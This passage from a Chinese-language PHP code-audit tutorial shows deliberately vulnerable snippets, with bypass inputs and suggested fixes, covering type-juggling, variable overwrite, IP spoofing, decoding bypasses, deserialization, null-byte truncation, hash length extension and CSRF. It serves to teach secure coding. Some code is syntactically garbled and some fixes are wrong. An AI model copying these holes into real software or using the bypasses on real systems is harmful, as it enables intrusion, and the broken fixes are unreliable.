class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>传入数组test[]=0可以绕过<br>修复建议：<br>将array_search第三个参数为true则就不能绕过<br>建议修复代码：<br>if (array_search(“admin”, $test, true) === 0) {</p>
<h3 id="6-4-strcmp绕过"><a href="#6-4-strcmp绕过" class="headerlink" title="6.4 strcmp绕过"></a>6.4 strcmp绕过</h3><h4 id="0x01漏洞背景-16"><a href="#0x01漏洞背景-16" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-10"><a href="#0x02漏洞代码及分析-10" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$password = &quot;*******&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    if (strcmp(_POST[&apos;password&apos;], password) == 0) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;Right!!!login success&quot;;</span><br><span class="line"></span><br><span class="line">        exit;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;Wrong password..&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在PHP&lt;5.3的情况下，password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等修复建议： 不建议使用该函数</p>
<h3 id="7-1变量覆盖漏洞"><a href="#7-1变量覆盖漏洞" class="headerlink" title="7.1变量覆盖漏洞"></a>7.1变量覆盖漏洞</h3><h4 id="0x01漏洞背景-17"><a href="#0x01漏洞背景-17" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击</p>
<h4 id="0x02漏洞代码及分析-11"><a href="#0x02漏洞代码及分析-11" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$auth = &apos;0&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line">if ($auth == 1) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;private!&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;public!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>将可控的数组变量解析，导致变量覆盖漏洞<br>修复建议：<br>不要将用户可控的数据进行变量解析<br>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var=<span class="string">'init'</span>;</span><br><span class="line"></span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $var;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>parse_str将字符串解析成多个变量，导致变量覆盖漏洞<br>修复建议：<br>不要将用户可控的数据进行变量解析<br>漏洞代码3：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$magic_quotes_gpc = ini_get(<span class="string">'magic_quotes_gpc'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_FilterAll</span><span class="params">(fk, &amp;svar)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> cfg_notallowstr, cfg_replacestr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array($svar)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (svar <span class="keyword">as</span> k =&gt; $v) &#123;</span><br><span class="line"></span><br><span class="line">svar[k] = _FilterAll(fk, v);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cfg_notallowstr != <span class="string">''</span> &amp;&amp; preg_match(<span class="string">"#"</span> . cfg_notallowstr . <span class="string">"#i"</span>, $svar)) &#123;</span><br><span class="line"></span><br><span class="line">ShowMsg(<span class="string">" &#123;$fk&#125; has not allow words!"</span>, <span class="string">'-1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cfg_replacestr != <span class="string">''</span>) &#123;</span><br><span class="line"></span><br><span class="line">svar = preg_replace(<span class="string">'/'</span> . cfg_replacestr . <span class="string">'/i'</span>, <span class="string">"***"</span>, $svar);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$magic_quotes_gpc) &#123;</span><br><span class="line"></span><br><span class="line">svar = addslashes(svar);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $svar;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该片段取自于dedecms变量覆盖漏洞</p>
<h3 id="7-2-IP伪造漏洞"><a href="#7-2-IP伪造漏洞" class="headerlink" title="7.2 IP伪造漏洞"></a>7.2 IP伪造漏洞</h3><h4 id="0x01漏洞背景-18"><a href="#0x01漏洞背景-18" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>header里CLIENT-IP与X-FORWARDED-FOR都是可以用随意伪造的，当这些值未经处理直接用，会导致XSS、SQL注入等漏洞</p>
<h4 id="0x02漏洞代码及分析-12"><a href="#0x02漏洞代码及分析-12" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_FORWARDED'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        ip = _SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIP();</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>修复建议：<br>对传入内容进行addslashes和htmlspecialchars过滤<br>建议修复代码：<br>return addslashes($ip);</p>
<h3 id="7-3编码绕过"><a href="#7-3编码绕过" class="headerlink" title="7.3编码绕过"></a>7.3编码绕过</h3><h4 id="0x01漏洞背景-19"><a href="#0x01漏洞背景-19" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>一般程序带有全局addslashes过滤，但是后面又对传入内容进行解码，解码之后内容没有进行过滤</p>
<h4 id="0x02漏洞代码及分析-13"><a href="#0x02漏洞代码及分析-13" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>, <span class="string">'code'</span>); <span class="comment">//数据库连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    username = base64_decode(addslashes(_POST[<span class="string">'username'</span>]));</span><br><span class="line"></span><br><span class="line">    data = mysqli - &gt;query(<span class="string">"select * from user where username='$username'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($data - &gt;num_rows !== <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        arr = data - &gt;fetch_row();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>虽然对POST传入内容过滤，可经过二次编码绕过过滤<br>修复建议：<br>在解码之后再进行一次字符串过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = addslashes(base64_decode(addslashes(_POST[<span class="string">'username'</span>])));</span><br></pre></td></tr></table></figure>
<h3 id="7-4反序列化漏洞"><a href="#7-4反序列化漏洞" class="headerlink" title="7.4反序列化漏洞"></a>7.4反序列化漏洞</h3><h4 id="0x01漏洞背景-20"><a href="#0x01漏洞背景-20" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>php反序列化漏洞又称对象注入，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题</p>
<h4 id="0x02漏洞代码及分析-14"><a href="#0x02漏洞代码及分析-14" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.this - &gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.this - &gt;password;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span> - &gt;file);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">'str'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>test类的魔术方法中存在可以利用的地方，通过反序列化漏洞可以控制变量，达到写入文件的效果<br>修复建议：<br>如果代码中有反序列化，不要在类的魔术方法中进行敏感操作</p>
<h3 id="7-5截断漏洞"><a href="#7-5截断漏洞" class="headerlink" title="7.5截断漏洞"></a>7.5截断漏洞</h3><h4 id="0x01漏洞背景-21"><a href="#0x01漏洞背景-21" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>PHP&lt;5.3.4中，<strong>%00</strong>可截断字符串，在写入文件时截断路径导致任意文件名写入</p>
<h4 id="0x02漏洞代码及分析-15"><a href="#0x02漏洞代码及分析-15" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>这里限制了前缀跟后缀，但是没有过滤../跟%00截断漏洞，导致可以任意文件读取<br>修复建议：<br>不允许..等跨目录字符出现，使用addslashes过滤%00防止被截断包含<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">id = addslashes(_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr($id, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = file_get_contents(<span class="string">'upload/'</span>.id.<span class="string">'.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>ereg函数存在NULL截断漏洞<br>修复建议：<br>停止使用ereg与eregi函数<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_replace(<span class="string">"/[a-zA-Z0-9]+/"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br></pre></td></tr></table></figure>
<h3 id="7-6-hash长度扩展攻击漏洞"><a href="#7-6-hash长度扩展攻击漏洞" class="headerlink" title="7.6 hash长度扩展攻击漏洞"></a>7.6 hash长度扩展攻击漏洞</h3><h4 id="0x01漏洞背景-22"><a href="#0x01漏洞背景-22" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。</p>
<h4 id="0x02漏洞代码及分析-16"><a href="#0x02漏洞代码及分析-16" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line"></span><br><span class="line">password = _POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (COOKIE[<span class="string">"getmein"</span>] === md5(secret.urldecode(username.password))) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"The flag is "</span>.$flag);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞产生条件是当可控内容拼接在$secret后面，再进行md5加密；且要知道同样是经过$secret加密后的32位md5</p>
<ul>
<li>修复建议：</li>
</ul>
<p>将$secret放到后面<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (COOKIE[<span class="string">"getmein"</span>] === md5(urldecode(username . password). secret)) &#123;</span><br></pre></td></tr></table></figure>
<h3 id="7-7-CSRF跨站请求伪造漏洞"><a href="#7-7-CSRF跨站请求伪造漏洞" class="headerlink" title="7.7 CSRF跨站请求伪造漏洞"></a>7.7 CSRF跨站请求伪造漏洞</h3><h4 id="0x01漏洞背景-23"><a href="#0x01漏洞背景-23" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>​    在跨站请求伪造（CSRF）攻击里面，攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。而浏览器的安全策略是允许当前页面发送到任何地址的请求，因此也就意味着当用户在浏览他/她无法控制的资源时，攻击者可以控制页面的内容来控制浏览器发送它精心构造的请求。</p>
<h4 id="0x02漏洞代码及分析-17"><a href="#0x02漏洞代码及分析-17" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'user.php'</span>; <span class="comment">//验证用户登录</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'act'</span>] == <span class="string">'newpwd'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    newpwd = md5(_POST[<span class="string">'newpwd'</span>]);</span><br><span class="line"></span><br><span class="line">    sql = <span class="string">"update user set password='newpwd' where id=$userid"</span>;</span><br><span class="line"></span><br><span class="line">    mysql_query($sql);</span><br><span class="line"></span><br><span class="line">    mysql_close($conn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'修改密码成功'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对CSRF进行任何防御，可以恶意构造表单，用户触发后可以修改其密码<br>修复建议：<br><strong>验证HTTP Referer字段、在请求地址中添加 token并验证、用XMLHttpRequest附加在header里</strong></p>
<h3 id="7-8-SSRF请求伪造漏洞"><a href="#7-8-SSRF请求伪造漏洞" class="headerlink" title="7.8 SSRF请求伪造漏洞"></a>7.8 SSRF请求伪造漏洞</h3><h4 id="0x01漏洞背景-24"><a href="#0x01漏洞背景-24" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从 外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h4 id="0x02漏洞代码及分析-18"><a href="#0x02漏洞代码及分析-18" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
